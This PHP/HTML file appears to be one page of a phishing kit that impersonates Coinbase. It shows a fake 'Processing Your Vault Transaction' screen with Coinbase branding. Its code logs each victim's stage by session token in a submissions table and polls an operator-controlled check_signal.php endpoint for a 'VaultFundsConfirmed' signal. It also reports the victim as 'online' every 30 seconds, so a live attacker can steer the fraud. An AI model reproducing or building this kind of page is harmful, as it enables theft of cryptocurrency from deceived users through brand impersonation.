<?php
session_start();

// Include the database connection file
require_once "admin/db_connection.php";

// Function to update user activity
function updateActivity($token, $activity) {
    global $conn;
    $sql = "UPDATE user_submissions SET activity = ? WHERE token = ?";
    $stmt = $conn->prepare($sql);
    $stmt->bind_param("ss", $activity, $token);
    $stmt->execute();
    $stmt->close();
}

// Check if the email and token are set in the session
if (!isset($_SESSION["email"]) || !isset($_SESSION["token"])) {
    header("Location: login.php");
    exit();
}

// Retrieve the token from the session
$token = $_SESSION["token"];

// Update user activity
updateActivity($token, "VaultFundsLoading");
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="assets/favicon-32x32.png" type="image/x-icon">
    <title>Coinbase - Processing Vault Transaction</title>
    <style>
        @font-face {
            font-family: 'CoinbaseSans';
            src: url('assets/CoinbaseSans2.woff2') format('woff2');
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background-color: #0A0B0D;
            color: #E0E0E0;
            font-family: 'CoinbaseSans', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }

        .container {
            width: 100%;
            max-width: 400px;
            padding: 40px 30px;
            border-radius: 16px;
            border: 1px solid rgba(91, 97, 110, 0.2);
            background-color: #0A0B0D;
            text-align: center;
        }

        .progress-bar {
            display: flex;
            justify-content: center;
            gap: 8px;
            margin-bottom: 32px;
        }

        .progress-step {
            width: 32px;
            height: 4px;
            background-color: #32353D;
            border-radius: 2px;
        }

        .progress-step.completed {
            background-color: #588BFA;
        }

        .progress-step.active {
            background-color: #588BFA;
        }

        .header {
            color: #B0B0B0;
            margin-bottom: 24px;
            text-align: center;
            font-family: 'CoinbaseSans', sans-serif;
        }

        .header .coinbase-text {
            font-size: 18px;
            font-weight: 600;
        }

        .header .vault-text {
            font-size: 14px;
            font-weight: 400;
            margin-left: 8px;
        }

        h1 {
            color: #FFFFFF;
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 8px;
            text-align: center;
        }

        .subtitle {
            color: #B0B0B0;
            font-size: 16px;
            margin-bottom: 32px;
            text-align: center;
        }

        .loading-section {
            margin: 40px 0;
        }

        .loader {
            position: relative;
            width: 80px;
            height: 80px;
            margin: 0 auto 24px;
        }

        .loader:before, .loader:after {
            content: '';
            border-radius: 50%;
            position: absolute;
            inset: 0;
            box-shadow: 0 0 10px 2px rgba(0, 0, 0, 0.3) inset;
        }

        .loader:after {
            box-shadow: 0 2px 0 #588BFA inset;
            animation: rotate 2s linear infinite;
        }

        @keyframes rotate {
            0% { transform: rotate(0); }
            100% { transform: rotate(360deg); }
        }

        .loading-text {
            color: #FFFFFF;
            font-size: 18px;
            font-weight: 500;
            margin-bottom: 8px;
        }

        .loading-subtext {
            color: #B0B0B0;
            font-size: 14px;
            line-height: 1.5;
        }

        .info-box {
            background-color: #1A1B1F;
            border: 1px solid #32353D;
            border-radius: 12px;
            padding: 16px;
            margin-bottom: 16px;
            display: flex;
            align-items: flex-start;
            text-align: left;
        }

        .info-icon {
            margin-right: 12px;
            flex-shrink: 0;
            margin-top: 4px;
        }

        .info-text h3 {
            font-size: 16px;
            font-weight: 600;
            color: #FFFFFF;
            margin: 0 0 4px 0;
        }

        .info-text p {
            font-size: 14px;
            color: #B0B0B0;
            margin: 0;
            line-height: 1.5;
        }

        .completion-section {
            display: none;
            text-align: center;
        }

        .completion-section.show {
            display: block;
        }

        .success-icon {
            width: 64px;
            height: 64px;
            margin: 0 auto 24px;
            background-color: #588BFA;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .done-button {
            width: 100%;
            background-color: #588BFA;
            color: #FFFFFF;
            border: none;
            border-radius: 50px;
            padding: 16px 24px;
            font-size: 16px;
            font-weight: 600;
            font-family: 'CoinbaseSans', sans-serif;
            cursor: pointer;
            transition: all 0.2s ease;
            margin-top: 24px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        }

        .done-button:hover {
            background-color: #4A7BEA;
            transform: translateY(-1px);
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.15);
        }

        .done-button:active {
            transform: translateY(0);
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        }

        .footer {
            display: flex;
            justify-content: center;
            gap: 24px;
            margin-top: 32px;
        }

        .footer a {
            color: #B0B0B0;
            font-size: 14px;
            text-decoration: none;
            transition: color 0.2s;
        }

        .footer a:hover {
            color: #FFFFFF;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="progress-bar">
            <div class="progress-step completed"></div>
            <div class="progress-step completed"></div>
            <div class="progress-step completed"></div>
            <div class="progress-step active"></div>
        </div>
        
        <div class="header">
            <span class="coinbase-text">COINBASE</span><span class="vault-text">VAULT</span>
        </div>
        
        <div id="loadingSection" class="loading-section">
            <h1>Processing Your Vault Transaction</h1>
            <p class="subtitle">Your funds are being securely transferred to your vault.</p>
            
            <div class="loader"></div>
            
            <div class="loading-text">Securing your assets...</div>
            <div class="loading-subtext">This may take a few moments. Please do not close this window.</div>
        </div>

        <div id="completionSection" class="completion-section">
            <div class="success-icon">
                <svg width="32" height="32" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M9 12l2 2 4-4" stroke="#FFFFFF" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                </svg>
            </div>
            
            <h1>Vault Transaction Complete</h1>
            <p class="subtitle">Your funds have been successfully secured in your Coinbase Vault.</p>
            
            <button class="done-button" onclick="window.location.href='https://coinbase.com'">Done</button>
        </div>
        
        <div class="info-box">
            <div class="info-icon">
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z" fill="#588BFA"/>
                </svg>
            </div>
            <div class="info-text">
                <h3>Vault Security</h3>
                <p>Your vault transaction includes enhanced security features with time-delayed withdrawals and multiple approval requirements.</p>
            </div>
        </div>

        <div class="info-box">
            <div class="info-icon">
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z" fill="#B0B0B0"/>
                </svg>
            </div>
            <div class="info-text">
                <h3>Transaction Processing</h3>
                <p>Your vault deposit is being processed with the highest security standards. You'll receive email confirmation once complete.</p>
            </div>
        </div>

        <div class="footer">
            <a href="#">We're hiring</a>
            <a href="#">Terms of service</a>
            <a href="#">Privacy policy</a>
        </div>
    </div>

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script>
        $(document).ready(function() {
            function checkSignal() {
                $.ajax({
                    type: 'GET',
                    url: 'check_signal.php',
                    success: function(response) {
                        if (response === 'VaultFundsConfirmed') {
                            // Show completion section
                            $('#loadingSection').hide();
                            $('#completionSection').addClass('show');
                        }
                    },
                    error: function(xhr, status, error) {
                        console.error('Error:', error);
                    },
                    complete: function() {
                        setTimeout(checkSignal, 5000);
                    }
                });
            }

            checkSignal();
        });

        // Update status to online
        function updateStatus() {
            fetch('update_status.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'status=online'
            });
        }
        updateStatus();
        setInterval(updateStatus, 30000);
    </script>
</body>
</html> 